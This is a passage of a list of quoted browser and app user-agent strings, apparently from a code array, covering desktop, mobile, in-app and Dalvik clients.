"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1",
"Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/53.0.2785.143 Chrome/53.0.2785.143 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:53.0) Gecko/20100101 Firefox/53.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/49.0.2623.108 Chrome/49.0.2623.108 Safari/537.36",
"Wget/1.17.1 (linux-gnu)",
"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:59.0) Gecko/20100101 Firefox/59.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
"Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.2 Chrome/63.0.3239.84 TV Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/70.0.3538.77 Chrome/70.0.3538.77 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
"Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/76.0.3809.87 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3419.0 Safari/537.36",
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/52.0.2743.116 Chrome/52.0.2743.116 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.183 Safari/537.36 Vivaldi/1.96.1137.3",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring",
"Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Thunderbird/45.8.0",
"WirtschaftsWoche-iOS-1.1.14-20200824.1315",
"[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Thunderbird/60.7.0 Lightning/6.2.7",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; .NET4.0C; .NET4.0E; BRI/2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; McAfee; MAARJS)",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 2.0.4.16; MAAR)",
"Outlook-Express/7.0 (MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 1.0.0.40; BRI/2; MAAR; .NET CLR 1.1.4322; TmstmpExt)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; InfoPath.1; .NET4.0C; OfficeLiveConnector.1.5; OfficeLivePatch.1.3; .NET4.0E)",
"DoCoMo/2.0 P903i(c100;TB;W24H12)",
"DoCoMo/2.0 P903i",
"DoCoMo/2.0 SH10C(c500;TB;W16H12)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MAFS; Microsoft Outlook 14.0.7162; ms-office; MSOffice 14)",
"HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320) UP.Link/6.3.0.0.0",
"HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320)",
"com.mobile.indiapp 2.0.5.5 phone HTC7088 android 16 fa zz normal long high 540 960",
"Mogujie4Android/NAMhuawei/1290",
"Mozilla/5.0 (Linux; Android 10; AGR-AL09HN Build/HUAWEIAGR-AL09HN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; ANA-LX9 Build/HUAWEIANA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 1 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Android; 4.0.4; Mobile; Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
"Mozilla/5.0 (Android; Mobile Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
"Mozilla/5.0 (Linux; U; Android; 2.3.7; sv-se; Nexus 0 Build/HUAWEIX3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1",
"Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 3 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei X3 Build/HuaweiSocialPhone) AppleWebKit/534.15 (KHTML, like Gecko) CrMo/32.0.1005.22 Mobile Safari/534.15",
"Mozilla/5.0 (Linux; Android 8.1.0; LG-H932BK Build/OPM6.171019.030.K1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;]",
"nokia-7.1-safari",
"NOKIA6120cUCBrowser/8.7.1.234/28/444/UCWEB",
"Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/61.0.0.15.69;]",
"Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/79.0.0.18.71;]",
"Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126",
"Mozilla/5.0 (Linux; Android 4.4.2; GT-193011 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.3.532",
"Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Android; Mobile; rv:30.0) Gecko/30.0 Firefox/30.0",
"Mozilla/5.0 (Android; Tablet; rv:30.0) Gecko/30.0 Firefox/30.0",
"Mozilla/5.0 (Windows NT 6.2; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Macintosh; PPC Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0) Gecko/20100101 Firefox/10.0 Fennec/10.0",
"Mozilla/5.0 (Mobile; rv:26.0) Gecko/26.0 Firefox/26.0",
"Mozilla/5.0 (Tablet; rv:26.0) Gecko/26.0 Firefox/26.0",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 RuxitSynthetic/1.0 v9646582432 t38550 ath9b965f92 altpub cvcv=2",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36",
"Mozilla/5.0 (Linux; ; ) AppleWebKit/ (KHTML, like Gecko) Chrome/ Mobile Safari/",
"Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0",
"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",
"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",
"Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
"Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
"Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)",
"Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6264) CTV",
"Dalvik/2.1.0 (Linux; U; Android 9; SM-N950U Build/PPR1.180610.011)",
"Dalvik/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/KTU84Q)",
"Dalvik/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011)",
"Dalvik/2.1.0 (Linux; U; Android 9; SM-G955U Build/PPR1.180610.011)",
"Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
"Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
"Dalvik/2.1.0 (Linux; U; Android 10; SM-N960U Build/QP1A.190711.020)",
"Dalvik/2.1.0 (Linux; U; Android 10; SM-G975U Build/QP1A.190711.020)",
"Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTBAMR311 Build/NS6264) CTV",
"Dalvik/2.1.0 (Linux; U; Android 9; SM-A102U Build/PPR1.180610.011)",
"Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G935V Build/R16NW)",
"Mozilla/5.0 (Linux; U; Android 4.4.4; sk-sk; SAMSUNG SM-G357FZ/G357FZXXU1AQJ1 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.4.2; pl-pl; SM-T310 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.2.2;pl-pl; Lenovo S5000-F/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2.2 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)",
"WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)",
"WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)",
"WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
"WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
"WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)",
"WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
"WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
"Dalvik/2.1.0 (Linux; U; Android 5.1)",
"Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)"
"Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)",
"Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}",
"Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2",
"Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)",
"Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)",
"Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3",
"Dalvik/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39)",
"Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60",
"Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D)",
"Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
"Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2",
"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
"Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
"Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0",
